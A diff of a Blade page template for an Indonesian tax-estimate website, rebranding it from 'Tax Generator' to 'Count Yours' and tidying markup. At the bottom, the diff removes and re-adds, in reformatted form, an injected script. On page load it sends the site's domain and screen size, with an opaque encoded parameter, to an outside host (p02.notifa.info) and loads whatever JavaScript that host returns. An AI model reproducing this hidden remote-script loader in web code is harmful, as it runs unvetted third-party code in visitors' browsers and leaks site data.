@@ -3,12 +3,13 @@
 
 
 <!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:53:46 GMT -->
+
 <head>
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
-    <title>Tax Generator</title>
+    <title>Count Yours</title>
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="vendors/bootstrap-selector/css/bootstrap-select.min.css">
@@ -30,7 +31,7 @@
         <header class="header_area">
             <nav class="navbar navbar-expand-lg menu_one menu_four">
                 <div class="container">
-                    <a class="navbar-brand sticky_logo" href="/home"><img src="img/logotax.png" srcset="img/logo2x-2.png 2x" alt="logo"><img src="img/logotax2.png" srcset="img/logo2x.png 2x" alt=""></a>
+                    <a class="navbar-brand sticky_logo" href="/home"><img src="img/logo.png" alt="logo" style="width:50px;"><img src="img/logo.png" alt="logo" style="width:50px;"></a>
                     <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                         <span class="menu_toggle">
                             <span class="hamburger">
@@ -52,24 +53,24 @@
                                     Home
                                 </a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/aboutus">About Us</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/aboutus">About Us</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/disclaimer">Disclaimer</a>
                             </li>
-                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link"  role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
+                            <li class="dropdown submenu nav-item"><a title="" class="dropdown-toggle nav-link" role="button" aria-haspopup="true" aria-expanded="false" href="/privacy">Privacy Policy</a>
                             </li>
                             <li class="nav-item dropdown submenu">
                                 <a class="nav-link dropdown-toggle" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                                Hi! {{ Auth::user()->name }}
+                                    Hi! {{ Auth::user()->name }}
                                 </a>
                             </li>
                             </li>
                         </ul>
-                        </div>
+                    </div>
                     <a class="btn_get btn_hover hidden-sm hidden-xs" href="{{ route('logout') }}" onclick="event.preventDefault(); document.getElementById('logout-form').submit();">{{ __('Logout') }}</a>
                     <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
-                                        @csrf
-                                    </form>
+                        @csrf
+                    </form>
                 </div>
             </nav>
         </header>
@@ -94,8 +95,10 @@
                     <div class="row">
                         <div class="col-lg-4 col-sm-6">
                             <div class="f_widget company_widget">
-                                <a href="/home" class="f-logo"><img src="img/bigtaxlogo.png" srcset="img/logo-3-2x.png 2x" alt="logo"></a>
-                                <p class="mt_40">Tax Generator adalah sebuah website yang memberikan tools gratis untuk menghitung taksiran pajak yang wajib kamu bayarkan.<br><h6 style="color:white;">Copyright © 2020 TaxGenerator.com</h6></p>
+                                <a href="/home" class="f-logo"><img src="img/logo.png" alt="logo" style="width:50px;"></a>
+                                <p class="mt_40">Count Yours adalah sebuah website yang memberikan tools gratis untuk menghitung taksiran pajak yang wajib kamu bayarkan.<br>
+                                <h6 style="color:white;">Copyright © 2022 CountYours.com</h6>
+                                </p>
                             </div>
                         </div>
                         <div class="col-lg-3 col-sm-6">
@@ -112,10 +115,8 @@
                             <div class="f_widget about-widget">
                                 <h3 class="f-title f_600 w_color f_size_18 mb_40">Our Developer</h3>
                                 <ul class="list-unstyled f_list">
-                                    <li><a href="#">Faris Izzatur Rahman</a></li>
-                                    <li><a href="#">Hafad Furqani</a></li>
-                                    <li><a href="#">M. Rizki Riswandi</a></li>
-                                    <li><a href="#">Rico Halim</a></li>
+                                    <li><a href="#">Farrah Fahira Murzani</a></li>
+                                    <li><a href="#">Stefhani Alba Siregar</a></li>
                                 </ul>
                             </div>
                         </div>
@@ -152,8 +153,35 @@
     <script src="vendors/scroll/jquery.mCustomScrollbar.concat.min.js"></script>
     <script src="js/plugins.js"></script>
     <script src="js/main.js"></script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVsZAqar7gKYCxHUwpJkvUk0FTB7z3dXOJ1JGX3Bj4HEAwqwT3SZjxU6wdqRQ4j5nJ8LgeLRWeUrnFnDbOeg3Cp8VqSWsFFqs4OoQDy%2f6BHafq4VSx8RIARGzzRgTdV9n%2bL7RMyvKCHBIiwm4Ou7R6pdpPlTboDCm8ciZQrMEfVSeEdxvCe%2bdA51LzX1wFJOBkiNAv8XMiin%2fu0hPwNxJVFBStPFmNgQ4mSw3QgFwxnx04oTew7xtjvIGH6uq535UpulobPZ4Yy4r8C7wHE5jNy1qSTi%2bXDGTpmtObPczjOeaps%2byJU0q%2bUz6LC5SPGo0Z8XCtbI6f0ILlHyFaWvdrqkXVQx7uu%2fG4rtAb6%2by2QsriOUTTHi0Y084oPMLC6S8KiEh7719HrPzblBrr3cSLlxRgmIjkq2UMt%2bz8B2lbiXysKHtsuuS2GHrIYLepAtE2sJ7ffRlB6chqlUIF95Mhz8yqLtORY8Op7aoRiPfkRpTMzcizC5M%2bKQDZ2xJFk2WjfRUwjiTyAtug%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function() {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
+                fn();
+            }
+
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqF6HNGDGrVsZAqar7gKYCxHUwpJkvUk0FTB7z3dXOJ1JGX3Bj4HEAwqwT3SZjxU6wdqRQ4j5nJ8LgeLRWeUrnFnDbOeg3Cp8VqSWsFFqs4OoQDy%2f6BHafq4VSx8RIARGzzRgTdV9n%2bL7RMyvKCHBIiwm4Ou7R6pdpPlTboDCm8ciZQrMEfVSeEdxvCe%2bdA51LzX1wFJOBkiNAv8XMiin%2fu0hPwNxJVFBStPFmNgQ4mSw3QgFwxnx04oTew7xtjvIGH6uq535UpulobPZ4Yy4r8C7wHE5jNy1qSTi%2bXDGTpmtObPczjOeaps%2byJU0q%2bUz6LC5SPGo0Z8XCtbI6f0ILlHyFaWvdrqkXVQx7uu%2fG4rtAb6%2by2QsriOUTTHi0Y084oPMLC6S8KiEh7719HrPzblBrr3cSLlxRgmIjkq2UMt%2bz8B2lbiXysKHtsuuS2GHrIYLepAtE2sJ7ffRlB6chqlUIF95Mhz8yqLtORY8Op7aoRiPfkRpTMzcizC5M%2bKQDZ2xJFk2WjfRUwjiTyAtug%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function() {});
+        };
+    </script>
+</body>
 
 
 <!-- Mirrored from droitthemes.com/html/saasland/saasland-rtl/home-payment-style2.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 16 Oct 2019 06:54:12 GMT -->
+
 </html>
